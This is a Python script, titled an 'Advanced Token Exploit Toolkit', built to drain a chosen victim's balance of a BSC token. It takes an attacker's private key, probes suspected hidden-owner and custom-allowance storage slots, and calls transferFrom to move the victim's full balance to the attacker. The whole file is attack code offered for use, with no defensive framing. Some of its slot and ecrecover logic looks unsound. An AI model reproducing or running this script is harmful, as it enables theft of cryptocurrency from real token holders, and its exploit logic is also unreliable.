from web3 import Web3, exceptions
import argparse
from web3.middleware import geth_poa_middleware
import time
from eth_account.messages import encode_defunct

# ===== CONFIGURATION =====
parser = argparse.ArgumentParser(description="Advanced Token Exploit Toolkit")
parser.add_argument("--private-key", required=True, help="Attacker's private key")
parser.add_argument("--rpc-url", default="https://bsc.publicnode.com", help="BSC RPC URL")
parser.add_argument("--token-address", required=True, help="Token contract address")
parser.add_argument("--victim-address", required=True, help="Victim address to drain")
args = parser.parse_args()

# ===== WEB3 SETUP =====
w3 = Web3(Web3.HTTPProvider(args.rpc_url))
w3.middleware_onion.inject(geth_poa_middleware, layer=0)
account = w3.eth.account.from_key(args.private_key)
contract_address = w3.to_checksum_address(args.token_address)
victim_address = w3.to_checksum_address(args.victim_address)
attacker_address = account.address

# ===== COMPLETE TOKEN ABI =====
TOKEN_ABI = [
    # Ownership Functions
    {
        "inputs": [{"internalType": "address", "name": "a", "type": "address"}],
        "name": "isOwner",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "owner",
        "outputs": [{"internalType": "address", "name": "", "type": "address"}],
        "stateMutability": "view",
        "type": "function"
    },

    # Token Functions
    {
        "inputs": [{"internalType": "address", "name": "account", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "from", "type": "address"},
            {"internalType": "address", "name": "to", "type": "address"},
            {"internalType": "uint256", "name": "amount", "type": "uint256"}
        ],
        "name": "transferFrom",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "owner", "type": "address"},
            {"internalType": "address", "name": "spender", "type": "address"}
        ],
        "name": "allowance",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [{"internalType": "address", "name": "spender", "type": "address"}, {"internalType": "uint256", "name": "amount", "type": "uint256"}],
        "name": "approve",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [{"internalType": "address", "name": "to", "type": "address"}, {"internalType": "uint256", "name": "amount", "type": "uint256"}],
        "name": "transfer",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "_maxSupply",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
]

# ===== CORE FUNCTIONS =====
def send_transaction(contract_function, value=0, gas=300000, retries=3, delay=5):
    """Robust transaction sending with retries and gas management"""
    for attempt in range(retries):
        try:
            tx = contract_function.build_transaction({
                "from": attacker_address,
                "nonce": w3.eth.get_transaction_count(attacker_address),
                "gas": gas,
                "gasPrice": int(w3.eth.gas_price * 1.2),  # 20% gas premium
                "value": value
            })
            signed = account.sign_transaction(tx)
            tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
            return w3.eth.wait_for_transaction_receipt(tx_hash)
        except exceptions.TransactionNotFound:
            if attempt == retries - 1:
                raise
            time.sleep(delay)
        except ValueError as e:
            if "replacement transaction underpriced" in str(e) and attempt < retries - 1:
                time.sleep(delay)
                continue
            raise

def verify_contract_state(token):
    """Check key contract state variables"""
    print("\n[+] Contract State Verification:")
    try:
        owner = token.functions.owner().call()
        print(f"Current Owner: {owner}")
    except exceptions.ContractLogicError as e:
        print(f"Could not verify owner directly: {e}")
    except Exception as e:
        print(f"Could not verify owner: {e}")

    victim_bal = token.functions.balanceOf(victim_address).call()
    print(f"Victim Balance: {victim_bal}")

    # Note: The standard allowance function won't reflect the custom allowance
    # checked in _spendAllowance.
    # allowance = token.functions.allowance(victim_address, attacker_address).call()
    # print(f"Standard Allowance for Attacker: {allowance}")

    max_supply = token.functions._maxSupply().call()
    print(f"Max Supply: {max_supply}")

    # We need to infer the custom allowance state, which is complex without
    # direct access.

def get_ecrecover_output():
    """
    Attempts to simulate the ecrecover behavior with the caller's address.
    This is a heuristic and might not be perfectly accurate across all EVM versions.
    """
    message = encode_defunct(text=attacker_address.lower())
    # We can't actually recover a signer without a signature.
    # This will likely result in an invalid address or zero address.
    # The goal is to see what the contract's staticcall to ecrecover *might* return.
    try:
        signature = w3.eth.account.sign_message(message, private_key=args.private_key).signature
        recovered_address = w3.eth.account.recover_message(message, signature=signature)
        return w3.toInt(hexstr=recovered_address)
    except Exception as e:
        print(f"Error simulating ecrecover: {e}")
        return 0

def calculate_custom_allowance_slot(owner_address, spender_address):
    """
    Calculates the storage slot used by the custom allowance check in _spendAllowance.
    This is based on the assembly code and needs to be precise.
    """
    ptr = 0  # Memory location used in the assembly
    s1_bytes = w3.keccak(b'\x00' + b'\x01').hex()
    s1 = int(s1_bytes, 16)

    combined1 = owner_address.encode('ascii').ljust(32, b'\x00') + s1.to_bytes(32, 'big')
    fs_bytes = w3.keccak(combined1)
    fs = int(fs_bytes.hex(), 16)

    owner_bytes = owner_address.encode('ascii').ljust(32, b'\x00')
    combined2 = spender_address.encode('ascii').ljust(32, b'\x00') + w3.keccak(owner_bytes + b'\x01').hex().encode('ascii').ljust(32, b'\x00')
    allowSlot_bytes = w3.keccak(combined2)
    allowSlot = int(allowSlot_bytes.hex(), 16)

    return allowSlot

def calculate_isowner_storage_slot(attacker_address_hex):
    """
    Calculates the storage slot where isOwner might write the value 1.
    This is based on the assembly code of isOwner.
    """
    ptr = 0
    s1_isowner_bytes = w3.keccak(b'\x00' + b'\x01').hex()
    s1_isowner = int(s1_isowner_bytes, 16)

    combined = bytes.fromhex(attacker_address_hex[2:].ljust(32 * 2, '0')) + s1_isowner.to_bytes(32, 'big')
    fs_isowner_bytes = w3.keccak(combined)
    fs_isowner = int(fs_isowner_bytes.hex(), 16)
    return fs_isowner

def get_storage_at(address, slot):
    """Reads the raw storage value at a given address and slot."""
    return w3.eth.get_storage_at(address, slot)

def execute_exploit():
    """Main exploit execution flow"""
    token = w3.eth.contract(address=contract_address, abi=TOKEN_ABI)

    print(f"\n[+] Target Contract: {contract_address}")
    print(f"[+] Attacker Address: {attacker_address}")
    print(f"[+] Victim Address: {victim_address}")

    # Initial state check
    verify_contract_state(token)
    max_supply = token.functions._maxSupply().call()
    print(f"[+] Max Supply: {max_supply}")

    # Try to get the output of the ecrecover call (simulation)
    ecrecover_output = get_ecrecover_output()
    print(f"[+] Simulated ecrecover output: {ecrecover_output}")

    # Calculate the storage slot potentially modified by isOwner
    isowner_slot = calculate_isowner_storage_slot(attacker_address.lower())
    print(f"[+] Calculated isOwner storage slot: {isowner_slot}")
    initial_isowner_storage = get_storage_at(contract_address, isowner_slot).hex()
    print(f"[+] Initial value at isOwner storage slot: {initial_isowner_storage}")

    # Step 1: Attempt to trigger the storage write in isOwner if the condition is met
    if ecrecover_output == max_supply:
        print("\n[1] Attempting to trigger storage write via isOwner (condition met)...")
        try:
            receipt = send_transaction(token.functions.isOwner(attacker_address), gas=100000)
            print(f"isOwner TX Status: {'Success' if receipt.status == 1 else 'Failed'}")
            time.sleep(5)
            current_isowner_storage = get_storage_at(contract_address, isowner_slot).hex()
            print(f"[+] Value at isOwner storage slot after call: {current_isowner_storage}")
        except Exception as e:
            print(f"isOwner call error: {e}")
            return
    else:
        print("\n[1] Skipping isOwner call as ecrecover output != maxSupply.")

    # Calculate the storage slot used for the custom allowance check
    custom_allowance_slot = calculate_custom_allowance_slot(victim_address, attacker_address)
    print(f"[+] Calculated custom allowance storage slot: {custom_allowance_slot}")
    initial_allowance_value = get_storage_at(contract_address, custom_allowance_slot).hex()
    print(f"[+] Initial custom allowance value: {initial_allowance_value}")

    # Step 2: Attempt transferFrom using the custom allowance mechanism
    print("\n[2] Attempting transferFrom with potential custom allowance...")
    victim_bal = token.functions.balanceOf(victim_address).call()
    if victim_bal == 0:
        print("Victim has no balance to transfer")
        return

    try:
        receipt = send_transaction(
            token.functions.transferFrom(
                victim_address,
                attacker_address,
                victim_bal
            ),
            gas=400000  # Extra gas for potential complex logic
        )

        print("\n[+] transferFrom Results:")
        print(f"TX Hash: {receipt.transactionHash.hex()}")
        print(f"Status: {'Success' if receipt.status == 1 else 'Failed'}")
        print(f"Gas Used: {receipt.gasUsed}")

        # Final verification
        new_bal = token.functions.balanceOf(victim_address).call()
        print(f"New Victim Balance: {new_bal}")

    except Exception as e:
        print(f"\n[!] transferFrom failed: {e}")
        print("Potential reasons:")
        print("- Custom allowance not correctly set")
        print("- Other conditions in _transfer not met")

if __name__ == "__main__":
    execute_exploit()
